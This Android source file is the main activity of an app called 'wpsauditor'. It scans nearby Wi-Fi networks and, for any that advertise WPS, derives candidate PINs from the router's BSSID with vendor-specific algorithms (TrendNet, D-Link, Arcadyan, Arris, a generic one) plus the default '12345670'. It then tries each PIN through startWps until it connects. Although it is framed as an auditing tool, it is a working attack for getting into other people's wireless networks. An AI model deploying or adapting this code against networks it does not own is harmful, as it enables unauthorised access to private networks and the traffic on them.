package com.github.kooroshh.wpsauditor;

import android.app.ProgressDialog;
import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.DialogInterface;
import android.content.Intent;
import android.content.IntentFilter;
import android.net.ConnectivityManager;
import android.net.NetworkInfo;
import android.net.wifi.ScanResult;
import android.net.wifi.WifiInfo;
import android.net.wifi.WifiManager;
import android.net.wifi.WpsInfo;
import android.os.Bundle;
import android.os.Handler;
import android.support.design.widget.Snackbar;
import android.support.v4.widget.SwipeRefreshLayout;
import android.support.v7.app.AppCompatActivity;
import android.support.v7.widget.Toolbar;
import android.view.View;
import android.view.Menu;
import android.view.MenuItem;
import android.widget.AdapterView;
import android.widget.ListView;
import android.widget.Toast;


import java.util.ArrayList;
import java.util.Collections;
import java.util.Comparator;
import java.util.List;

public class MainActivity extends AppCompatActivity implements SwipeRefreshLayout.OnRefreshListener {


    ListView list;
    WifiManager wifiManager;
    List<ScanResult> mScanResults ;
    ProgressDialog dlg;
    SwipeRefreshLayout mSwipeRefreshLayout;
    WPSPins pins ;
    int lastPinIndex = 0 ;
    List<String> Algorithms;
    ScanResult mResult;
    WpsInfo info;
    Handler handler = new Handler();
    Runnable runnable;
    private Context getContext(){
        return this ;
    }

    WifiManager.WpsCallback callback = new WifiManager.WpsCallback() {
        @Override
        public void onStarted(String pin) {
            Toast.makeText(getContext(),"Starting Connection Against " + mResult.SSID,Toast.LENGTH_LONG).show();
        }

        @Override
        public void onSucceeded() {

        }

        @Override
        public void onFailed(int reason) {

        }
    };
    AdapterView.OnItemClickListener listListener = new AdapterView.OnItemClickListener() {
        @Override
        public void onItemClick(AdapterView<?> parent, View view, int position, long id) {
            mResult = mScanResults.get(position);
            if(mResult.capabilities.toLowerCase().contains("wps")){
                lastPinIndex = 0;
                Algorithms = new ArrayList<>();
                Algorithms.add(pins.Generic(mResult.BSSID));
                Algorithms.add(pins.TrendNet(mResult.BSSID));
                Algorithms.add(pins.Dlink(mResult.BSSID));
                Algorithms.add(pins.Arcadyan(mResult.BSSID));
                Algorithms.add(pins.Arris(mResult.BSSID));
                Algorithms.add("12345670");
                dlg = new ProgressDialog(getContext());
                dlg.setTitle("Connecting");
                dlg.setCancelable(true);
                dlg.setMessage("Trying To Connect");
                dlg.setProgressStyle(ProgressDialog.STYLE_HORIZONTAL);
                dlg.setMax(Algorithms.size());
                dlg.show();
                dlg.setOnCancelListener(new DialogInterface.OnCancelListener() {
                    @Override
                    public void onCancel(DialogInterface dialog) {
                        wifiManager.cancelWps(callback);
                    }
                });
                info = new WpsInfo();
                info.BSSID = mResult.BSSID;
                info.pin = Algorithms.get(lastPinIndex) ;
                info.setup = 2;
                wifiManager.startWps(info,callback );
                if(runnable != null){
                    handler.removeCallbacks(runnable);
                }
                runnable = new Runnable() {
                    @Override
                    public void run() {
                        ConnectivityManager connManager = (ConnectivityManager) getSystemService(Context.CONNECTIVITY_SERVICE);
                        NetworkInfo mWifi = connManager.getNetworkInfo(ConnectivityManager.TYPE_WIFI);

                        if (mWifi.isConnected()) {
                            WifiInfo wifiInfo;

                            wifiInfo = wifiManager.getConnectionInfo();
                            if(wifiInfo.getBSSID().toLowerCase().equals(mResult.BSSID.toLowerCase())){
                                Snackbar.make(mSwipeRefreshLayout, "You are connected to `" + mResult.SSID + "`", Snackbar.LENGTH_LONG).setAction("Dismiss", new View.OnClickListener() {
                                    @Override
                                    public void onClick(View v) {
                                        v.setVisibility(View.GONE);
                                    }
                                }).show();
                                handler.removeCallbacks(runnable);
                                dlg.dismiss();
                            }else{
                                if(Algorithms != null && lastPinIndex < Algorithms.size()){
                                    WpsInfo info = new WpsInfo();
                                    info.BSSID = mResult.BSSID;
                                    info.pin = Algorithms.get(lastPinIndex) ;
                                    info.setup = 3;
                                    dlg.setProgress(lastPinIndex++);
                                    wifiManager.cancelWps(callback);
                                    wifiManager.startWps(info, callback);
                                    handler.postDelayed(runnable, 6000);
                                }else{
                                    dlg.dismiss();
                                    Snackbar.make(mSwipeRefreshLayout, "Unable Connect To " + mResult.SSID, Snackbar.LENGTH_LONG).setAction("Dismiss", new View.OnClickListener() {
                                        @Override
                                        public void onClick(View v) {
                                            v.setVisibility(View.GONE);
                                        }
                                    }).show();
                                }
                            }
                        }else{
                            if(Algorithms != null && lastPinIndex < Algorithms.size()){
                                WpsInfo info = new WpsInfo();
                                info.BSSID = mResult.BSSID;
                                info.pin = Algorithms.get(lastPinIndex) ;
                                info.setup = 3;
                                dlg.setProgress(lastPinIndex++);
                                wifiManager.cancelWps(callback);
                                wifiManager.startWps(info, callback);
                                handler.postDelayed(runnable, 6000);
                            }else{
                                dlg.dismiss();
                                Snackbar.make(mSwipeRefreshLayout, "Unable Connect To " + mResult.SSID, Snackbar.LENGTH_LONG).setAction("Dismiss", new View.OnClickListener() {
                                    @Override
                                    public void onClick(View v) {
                                        v.setVisibility(View.GONE);
                                    }
                                }).show();
                            }
                        }
                    }
                };
                handler.postDelayed(runnable,6000);
            }else{
                Snackbar.make(view, "WPS is not available on " + mResult.SSID, Snackbar.LENGTH_SHORT).setAction("Dismiss", new View.OnClickListener() {
                    @Override
                    public void onClick(View v) {
                        v.setVisibility(View.GONE);
                    }
                }).show();
            }


        }
    };

    private void Refresh(){

            wifiManager = (WifiManager) getApplicationContext().getSystemService(WIFI_SERVICE);
            registerReceiver(new BroadcastReceiver() {
                @Override
                public void onReceive(Context context, Intent intent) {
                    if (intent.getAction().equals(WifiManager.SCAN_RESULTS_AVAILABLE_ACTION)) {
                        mScanResults = wifiManager.getScanResults();
                        Collections.sort(mScanResults, new Comparator<ScanResult>() {
                            @Override
                            public int compare(ScanResult lhs, ScanResult rhs) {
                                return (lhs.level < rhs.level ? -1 : (lhs.level == rhs.level ? 0 : 1));
                            }
                        });
                        Collections.reverse(mScanResults);
                        WiFi_List_Adapter adapter = new WiFi_List_Adapter(getContext(), mScanResults);
                        list.setAdapter(adapter);
                        list.setOnItemClickListener(listListener);
                        setRefreshing(false);
                    }
                }
            }, new IntentFilter(WifiManager.SCAN_RESULTS_AVAILABLE_ACTION));
            wifiManager.startScan();
    }
    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);
        Toolbar toolbar = (Toolbar) findViewById(R.id.toolbar);
        setSupportActionBar(toolbar);
        toolbar.setTitle("WPS Connection");
        toolbar.setSubtitle("8ThBiT Production");
        pins = new WPSPins();
        mSwipeRefreshLayout = (SwipeRefreshLayout) findViewById(R.id.swipe_layout);
        mSwipeRefreshLayout.setOnRefreshListener(this);
        list = ((ListView) findViewById(R.id.lst_wifi_list));
        //list.setFastScrollAlwaysVisible(true);
    }

    @Override
    public boolean onCreateOptionsMenu(Menu menu) {
        // Inflate the menu; this adds items to the action bar if it is present.
        getMenuInflater().inflate(R.menu.menu_main, menu);
        return true;
    }

    @Override
    public boolean onOptionsItemSelected(MenuItem item) {
        // Handle action bar item clicks here. The action bar will
        // automatically handle clicks on the Home/Up button, so long
        // as you specify a parent activity in AndroidManifest.xml.
        int id = item.getItemId();

        //noinspection SimplifiableIfStatement
        if (id == R.id.action_refresh){
            setRefreshing(true);
            Refresh();
            return true;
        }
        return super.onOptionsItemSelected(item);
    }

    @Override
    public void onRefresh() {
        Refresh();
    }
    private boolean isRefreshing(){
        return mSwipeRefreshLayout.isRefreshing();
    }
    private void setRefreshing(boolean state){
        mSwipeRefreshLayout.setRefreshing(state);
    }
}
